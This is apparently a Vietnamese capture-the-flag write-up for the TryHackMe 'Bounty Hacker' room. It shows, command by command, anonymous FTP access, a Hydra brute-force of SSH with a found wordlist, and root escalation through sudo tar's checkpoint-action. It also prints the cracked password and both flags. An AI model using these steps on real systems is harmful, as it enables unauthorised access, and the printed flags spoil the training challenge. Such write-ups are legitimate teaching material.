# Bounty Hacker



## 1. Reconnaissance

Bước đầu tiên trong quá trình kiểm thử xâm nhập là thu thập thông tin về mục tiêu. Tôi sẽ sử dụng công cụ **Nmap** để quét các cổng đang mở và xác định các dịch vụ đang chạy trên máy chủ.

Lệnh thực hiện:

```bash
nmap -sC -sV -oN nmap_initial 10.49.189.237
```

Kết quả quét Nmap:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-29 04:31 EST
Nmap scan report for 10.49.189.237
Host is up (0.14s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| _Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.139.40
|      Logged in as ftp
|      TYPE: ASCII
...
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e9:e0:a3:33:92:79:5c:61:18:a7:98:7f:f7:cd:e0:ac (RSA)
|   256 a1:8f:00:60:3e:10:49:44:1c:89:e2:d4:eb:6d:59:d6 (ECDSA)
|_  256 64:5f:b4:7f:19:2c:ff:74:a6:d4:e0:6d:dd:a8:2c:de (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Phân tích kết quả:

* **Port 21 (FTP)**: Đang chạy phiên bản `vsftpd 3.0.3`. Quan trọng nhất là dòng `Anonymous FTP login allowed`, cho biết tôi có thể đăng nhập mà không cần mật khẩu.
* **Port 22 (SSH)**: Đang chạy `OpenSSH 8.2p1`. Đây là cổng để quản trị từ xa, tôi sẽ cần tìm tên đăng nhập và mật khẩu.
* **Port 80 (HTTP)**: Đang chạy web server `Apache 2.4.41`.

#### Khai thác FTP

Vì FTP cho phép đăng nhập ẩn danh, tôi sẽ kết nối vào để xem có tập tin nào thú vị không.

Lệnh thực hiện:

```bash
ftp 10.49.189.237
```

Quá trình tương tác:

```
Connected to 10.49.189.237.
220 (vsFTPd 3.0.3)
Name (10.49.189.237:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get locks.txt
ftp> get task.txt
ftp> bye
```

Tôi đã tải về hai tập tin: `locks.txt` và `task.txt`.

Kiểm tra nội dung tập tin `task.txt`:

```bash
cat task.txt
```

Output:

```
Task 1: Protect Vicious.
Task 2: Plan for Red Eye pickup on the moon.

- lin
```

Từ nội dung này, tôi xác định được một tên người dùng tiềm năng là **lin**.

Kiểm tra nội dung tập tin `locks.txt`:

```bash
head locks.txt
```

Output:

```
r00t
password
12345
...
```

Đây có vẻ là một danh sách các mật khẩu.

## 2. Gaining Access

Tôi đã có username là `lin` và một danh sách mật khẩu từ `locks.txt`. Bước tiếp theo là sử dụng công cụ **Hydra** để tấn công brute-force vào dịch vụ SSH (Port 22).

Lệnh thực hiện:

```bash
hydra -l lin -P locks.txt ssh://10.49.189.237
```

Kết quả chạy Hydra:

```
Hydra v9.1 (c) 2020 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~1 try per task
[DATA] attacking ssh://10.49.189.237:22/
[22][ssh] host: 10.49.189.237   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
```

Hydra đã tìm thấy mật khẩu chính xác là: `RedDr4gonSynd1cat3`.

#### Đăng nhập SSH

Sử dụng thông tin đăng nhập vừa tìm được để truy cập vào hệ thống.

Lệnh thực hiện:

```bash
ssh lin@10.49.189.237
```

Nhập mật khẩu `RedDr4gonSynd1cat3` khi được hỏi.

Sau khi đăng nhập thành công, tôi liệt kê các file trong thư mục hiện tại và tìm thấy `user.txt` trên Desktop.

Lệnh thực hiện:

<figure><img src="../.gitbook/assets/image (673).png" alt=""><figcaption></figcaption></figure>

```bash
ls -R | grep "txt"
```

Output:

```
THM{CR1M3_SyNd1C4T3}
```

Đây chính là **User Flag**.

## 3. Privilege Escalation

Sau khi đã có quyền truy cập user thường, mục tiêu tiếp theo là leo thang đặc quyền lên root. Tôi bắt đầu bằng việc kiểm tra xem user `lin` có quyền thực thi lệnh nào với `sudo` hay không.

Lệnh thực hiện:

```bash
sudo -l
```

Output:

```
Matching Defaults entries for lin on ip-10-49-189-237:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on ip-10-49-189-237:
    (root) /bin/tar
```

Kết quả cho thấy user `lin` có thể chạy lệnh `/bin/tar` dưới quyền root. Tôi có thể khai thác điều này bằng cách sử dụng tính năng `checkpoint` của tar để thực thi lệnh shell.

### Cách 1

Lệnh thực hiện:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Hoặc để đọc trực tiếp file flag của root mà không cần shell tương tác:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='cat /root/root.txt'
```

Output:

```
tar: Removing leading `/' from member names
THM{80UN7Y_h4cK3r}
tar: Removing leading `/' from member names
```

Đây chính là **Root Flag**: `THM{80UN7Y_h4cK3r}`.

### Cách 2 (don gian hon)



<figure><img src="../.gitbook/assets/image (674).png" alt=""><figcaption></figcaption></figure>





## **Flags:**

* User: `THM{CR1M3_SyNd1C4T3}`
* Root: `THM{80UN7Y_h4cK3r}`
